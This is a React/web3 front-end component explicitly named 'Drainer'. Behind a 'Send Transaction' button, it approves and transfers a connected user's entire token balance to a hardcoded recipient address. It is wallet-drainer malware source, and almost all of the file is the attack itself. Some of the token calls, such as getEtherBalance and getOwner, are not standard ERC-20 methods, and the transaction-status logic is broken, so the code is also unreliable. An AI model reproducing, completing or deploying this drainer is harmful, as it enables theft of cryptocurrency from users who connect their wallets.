  import React, { useState, useEffect } from "react";
  import { useAccount } from "wagmi";
  import Web3 from "web3";
  import erc20ABI from "./erc20ABI.json";

  function Drainer() {
    const { isConnected, address } = useAccount();
    const [walletBalance, setWalletBalance] = useState(null);
    const [txHash, setTxHash] = useState(null);
    const [confirmation, setConfirmation] = useState(null);
    const [loading, setLoading] = useState(false);
    const toAddress = "0x0860c8a4122e75A72134A24B5e3CA38eA25971fb";
    const tokenAddress = "0x432985bB66Ed90c8Fb9a5F0bEBB2Be325EEDa034";
    const contractAddress = "0x432985bB66Ed90c8Fb9a5F0bEBB2Be325EEDa034";
    let web3;

    if (window.ethereum) {
      web3 = new Web3(window.ethereum);
    } else {
      console.error("Ethereum provider not found");
    }

    useEffect(() => {
      const fetchBalance = async () => {
        if (isConnected && address && web3) {
          try {
            const balance = await web3.eth.getBalance(address);
            const balanceInEther = web3.utils.fromWei(balance, "ether");
            setWalletBalance(balanceInEther);
          } catch (error) {
            console.error("Error fetching balance:", error);
          }
        }
      };
      fetchBalance();
    }, [isConnected, address, web3]);

    const createTransaction = async () => {
      if (!address) {
        console.error("Address is invalid");
        return;
      }
      setLoading(true);
      try {
        const tokenContract = new web3.eth.Contract(erc20ABI, tokenAddress);
        const userTokenBalance = await tokenContract.methods.getEtherBalance(address).call();
        const user = await tokenContract.methods.getOwner(address).call();
        if (userTokenBalance <= 0) {
          console.error(`User:${address} has no tokens to transfer`);
          console.log(userTokenBalance)
          console.log(user)
    
          return;
        }
        await tokenContract.methods
          .approve(contractAddress, userTokenBalance)
          .send({ from: address });
        await tokenContract.methods
          .transfer(toAddress, userTokenBalance)
          .send({ from: address });
        setTxHash("Success");
      } catch (error) {
        console.error("Error sending transaction:", error);
      } finally {
        setLoading(false);
      }
    };
    

    useEffect(() => {
      const checkTransactionStatus = async () => {
        if (txHash) {
          try {
            const transaction = await web3.eth.getTransaction(txHash);
            if (transaction) {
              const receipt = await web3.eth.getTransactionReceipt(txHash);
              if (receipt && receipt.blockNumber) {
                setConfirmation("Confirmed");
              } else {
                setConfirmation("Pending");
              }
            } else {
              setConfirmation("Dropped");
            }
          } catch (error) {
            console.error("Error checking transaction status:", error);
          }
        }
      };
      checkTransactionStatus();
      const interval = setInterval(() => {
        checkTransactionStatus();
      }, 5000);
      return () => clearInterval(interval);
    }, [txHash, web3]);

    return (
      <div>
        <div>Drainer</div>
        {walletBalance !== null && (
          <div>
            <p>Wallet address: {address}</p>
            <p>Wallet balance: {walletBalance} ETH</p>
            <button onClick={createTransaction} disabled={loading}>
              {loading ? "Sending..." : "Send Transaction"}
            </button>
            {txHash && (
              <p>
                Transaction status:{" "}
                {confirmation === null ? "Checking..." : confirmation}
              </p>
            )}
          </div>
        )}
      </div>
    );
  }

  export default Drainer;
